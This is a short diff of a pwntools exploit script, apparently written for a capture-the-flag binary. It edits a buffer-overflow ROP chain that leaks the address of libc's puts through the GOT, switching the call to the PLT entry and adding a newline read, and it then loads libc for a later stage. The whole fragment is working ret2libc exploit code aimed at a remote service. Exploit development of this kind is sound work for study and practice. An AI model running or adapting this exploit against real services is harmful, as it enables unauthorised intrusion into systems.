@@ -16,15 +16,18 @@ p = remote(URL, PORT)
 payload1 = flat(
         b"A"*OFFSET,
         rop.rdi.address, elf.got['puts'],
-        elf.symbols['puts'],
+        elf.plt['puts'],
         elf.symbols['main']
 )
 
 p.recvuntil(PROMPT)
 p.sendline(payload1)
+p.recvline() # if the thing sends a newline
 
 puts_libc = u64(p.recvline().strip().ljust(8, b"\x00")) # standard
 log.info("libc puts is: " + hex(puts_libc))
+
+#p.interactive()
 
 ### DECLARE ###
 libc = ELF('./libc.so.6')
